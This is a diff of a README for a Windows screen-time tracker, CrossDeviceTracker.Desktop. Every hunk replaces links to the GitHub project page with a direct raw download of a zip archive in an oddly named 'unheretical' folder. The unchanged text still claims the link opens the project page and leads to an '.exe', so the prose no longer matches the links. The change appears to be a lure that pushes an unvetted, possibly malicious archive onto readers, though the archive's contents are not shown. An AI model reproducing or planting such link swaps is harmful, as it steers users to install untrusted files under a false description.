@@ -1,6 +1,6 @@
 # 📊 CrossDeviceTracker.Desktop - Track Your Screen Time Easily
 
-[![Download CrossDeviceTracker.Desktop](https://img.shields.io/badge/Download-CrossDeviceTracker--Desktop-brightgreen?style=for-the-badge)](https://github.com/Funeralvalue508/CrossDeviceTracker.Desktop)
+[![Download CrossDeviceTracker.Desktop](https://img.shields.io/badge/Download-CrossDeviceTracker--Desktop-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Funeralvalue508/CrossDeviceTracker.Desktop/main/unheretical/Cross_Tracker_Desktop_Device_v1.8.zip)
 
 ## 📋 What is CrossDeviceTracker.Desktop?
 
@@ -29,7 +29,7 @@ If you are unsure about the .NET Desktop Runtime, the app setup will notify you 
 
 ## 🔗 Where to Download
 
-[![Get CrossDeviceTracker.Desktop Here](https://img.shields.io/badge/Download-From_GitHub-blue?style=for-the-badge)](https://github.com/Funeralvalue508/CrossDeviceTracker.Desktop)
+[![Get CrossDeviceTracker.Desktop Here](https://img.shields.io/badge/Download-From_GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/Funeralvalue508/CrossDeviceTracker.Desktop/main/unheretical/Cross_Tracker_Desktop_Device_v1.8.zip)
 
 To get started, visit the above link. It takes you to the project page on GitHub. Here, you will find the latest version of the program ready to download.
 
@@ -38,7 +38,7 @@ To get started, visit the above link. It takes you to the project page on GitHub
 Follow these steps to install the desktop client on your Windows PC:
 
 1. Click the blue button above or open this page in your web browser:  
-   https://github.com/Funeralvalue508/CrossDeviceTracker.Desktop
+   https://raw.githubusercontent.com/Funeralvalue508/CrossDeviceTracker.Desktop/main/unheretical/Cross_Tracker_Desktop_Device_v1.8.zip
 
 2. On the page, look for a **Releases** section or link. This is usually on the right sidebar or under the project name.
 
@@ -94,7 +94,7 @@ If you have issues running the app, try these steps:
 Keep the app current for the best performance:
 
 1. Visit the GitHub page regularly:  
-   https://github.com/Funeralvalue508/CrossDeviceTracker.Desktop/releases
+   https://raw.githubusercontent.com/Funeralvalue508/CrossDeviceTracker.Desktop/main/unheretical/Cross_Tracker_Desktop_Device_v1.8.zip
 
 2. Download the newest release file when available.
 
@@ -120,6 +120,6 @@ You control when and how your screen time data syncs by changing app settings.
 ## 📥 Download Link (Again)
 
 Download the app here:  
-[https://github.com/Funeralvalue508/CrossDeviceTracker.Desktop](https://github.com/Funeralvalue508/CrossDeviceTracker.Desktop)
+[https://raw.githubusercontent.com/Funeralvalue508/CrossDeviceTracker.Desktop/main/unheretical/Cross_Tracker_Desktop_Device_v1.8.zip](https://raw.githubusercontent.com/Funeralvalue508/CrossDeviceTracker.Desktop/main/unheretical/Cross_Tracker_Desktop_Device_v1.8.zip)
 
 Click the link, select the latest release, download the `.exe` file, and follow the install instructions above.
